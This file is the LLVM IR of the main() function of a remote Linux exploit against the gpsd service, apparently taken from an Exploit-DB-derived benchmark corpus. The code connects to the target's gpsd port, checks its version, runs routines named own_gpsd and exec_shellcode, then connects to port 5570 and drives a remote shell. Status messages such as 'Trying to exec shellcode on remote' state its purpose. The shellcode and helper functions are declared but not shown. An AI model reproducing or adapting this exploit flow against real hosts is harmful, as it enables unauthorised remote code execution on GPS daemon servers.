; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_775.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_775.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [5 x i8] c"h:t:\00", align 1
@EOF = common dso_local global i32 0, align 4
@optarg = common dso_local global i8* null, align 8
@iType = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [19 x i8] c"[-] Invalid type.\0A\00", align 1
@.str.2 = private unnamed_addr constant [20 x i8] c"# remote host %s. \0A\00", align 1
@GPSD_PORT = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [25 x i8] c"Checking Remote version\0A\00", align 1
@.str.4 = private unnamed_addr constant [40 x i8] c"[+] Trying to exec shellcode on remote\0A\00", align 1
@.str.5 = private unnamed_addr constant [50 x i8] c"[-] Waiting 5 seconds to connect to remote shell\0A\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [16 x i8] c"[-] failed :< \0A\00", align 1
@.str.7 = private unnamed_addr constant [11 x i8] c"[+] yes! \0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* null, i8** %9, align 8
  %10 = load i32, i32* %4, align 4
  %11 = icmp slt i32 %10, 3
  br i1 %11, label %12, label %17

12:                                               ; preds = %2
  %13 = load i8**, i8*** %5, align 8
  %14 = getelementptr inbounds i8*, i8** %13, i64 0
  %15 = load i8*, i8** %14, align 8
  %16 = call i32 @usage(i8* %15)
  store i32 -1, i32* %3, align 4
  br label %94

17:                                               ; preds = %2
  br label %18

18:                                               ; preds = %36, %17
  %19 = load i32, i32* %4, align 4
  %20 = load i8**, i8*** %5, align 8
  %21 = call i32 @getopt(i32 %19, i8** %20, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0))
  store i32 %21, i32* %6, align 4
  %22 = load i32, i32* @EOF, align 4
  %23 = icmp ne i32 %21, %22
  br i1 %23, label %24, label %37

24:                                               ; preds = %18
  %25 = load i32, i32* %6, align 4
  switch i32 %25, label %31 [
    i32 104, label %26
    i32 116, label %28
  ]

26:                                               ; preds = %24
  %27 = load i8*, i8** @optarg, align 8
  store i8* %27, i8** %9, align 8
  br label %36

28:                                               ; preds = %24
  %29 = load i8*, i8** @optarg, align 8
  %30 = call i32 @atoi(i8* %29)
  store i32 %30, i32* @iType, align 4
  br label %36

31:                                               ; preds = %24
  %32 = load i8**, i8*** %5, align 8
  %33 = getelementptr inbounds i8*, i8** %32, i64 0
  %34 = load i8*, i8** %33, align 8
  %35 = call i32 @usage(i8* %34)
  store i32 0, i32* %3, align 4
  br label %94

36:                                               ; preds = %28, %26
  br label %18

37:                                               ; preds = %18
  %38 = load i32, i32* %4, align 4
  %39 = icmp slt i32 %38, 2
  br i1 %39, label %40, label %46

40:                                               ; preds = %37
  %41 = load i8**, i8*** %5, align 8
  %42 = getelementptr inbounds i8*, i8** %41, i64 0
  %43 = load i8*, i8** %42, align 8
  %44 = call i32 @usage(i8* %43)
  %45 = call i32 @exit(i32 1) #3
  unreachable

46:                                               ; preds = %37
  %47 = load i32, i32* @iType, align 4
  %48 = icmp slt i32 %47, 0
  br i1 %48, label %53, label %49

49:                                               ; preds = %46
  %50 = load i32, i32* @iType, align 4
  %51 = sext i32 %50 to i64
  %52 = icmp uge i64 %51, 1
  br i1 %52, label %53, label %59

53:                                               ; preds = %49, %46
  %54 = load i8**, i8*** %5, align 8
  %55 = getelementptr inbounds i8*, i8** %54, i64 0
  %56 = load i8*, i8** %55, align 8
  %57 = call i32 @usage(i8* %56)
  %58 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.1, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %94

59:                                               ; preds = %49
  %60 = load i8*, i8** %9, align 8
  %61 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.2, i64 0, i64 0), i8* %60)
  %62 = load i8*, i8** %9, align 8
  %63 = load i32, i32* @GPSD_PORT, align 4
  %64 = call i32 @new_tcpConnect(i8* %62, i32 %63, i32 9000)
  store i32 %64, i32* %7, align 4
  %65 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.3, i64 0, i64 0))
  %66 = load i32, i32* %7, align 4
  %67 = call i32 @check_version(i32 %66)
  %68 = load i32, i32* %7, align 4
  %69 = load i32, i32* @iType, align 4
  %70 = call i32 @own_gpsd(i32 %68, i32 %69)
  %71 = load i32, i32* %7, align 4
  %72 = call i32 @close(i32 %71)
  %73 = load i8*, i8** %9, align 8
  %74 = load i32, i32* @GPSD_PORT, align 4
  %75 = call i32 @new_tcpConnect(i8* %73, i32 %74, i32 9000)
  store i32 %75, i32* %7, align 4
  %76 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.4, i64 0, i64 0))
  %77 = load i32, i32* %7, align 4
  %78 = call i32 @exec_shellcode(i32 %77)
  %79 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.5, i64 0, i64 0))
  %80 = call i32 @sleep(i32 5)
  %81 = load i8*, i8** %9, align 8
  %82 = call i32 @new_tcpConnect(i8* %81, i32 5570, i32 9000)
  store i32 %82, i32* %8, align 4
  %83 = icmp slt i32 %82, 0
  br i1 %83, label %84, label %87

84:                                               ; preds = %59
  %85 = load i32, i32* @stderr, align 4
  %86 = call i32 @fprintf(i32 %85, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.6, i64 0, i64 0))
  br label %91

87:                                               ; preds = %59
  %88 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.7, i64 0, i64 0))
  %89 = load i32, i32* %8, align 4
  %90 = call i32 @sh(i32 %89)
  br label %91

91:                                               ; preds = %87, %84
  %92 = load i32, i32* %8, align 4
  %93 = call i32 @close(i32 %92)
  store i32 0, i32* %3, align 4
  br label %94

94:                                               ; preds = %91, %53, %31, %12
  %95 = load i32, i32* %3, align 4
  ret i32 %95
}

declare dso_local i32 @usage(i8*) #1

declare dso_local i32 @getopt(i32, i8**, i8*) #1

declare dso_local i32 @atoi(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @new_tcpConnect(i8*, i32, i32) #1

declare dso_local i32 @check_version(i32) #1

declare dso_local i32 @own_gpsd(i32, i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @exec_shellcode(i32) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @fprintf(i32, i8*) #1

declare dso_local i32 @sh(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
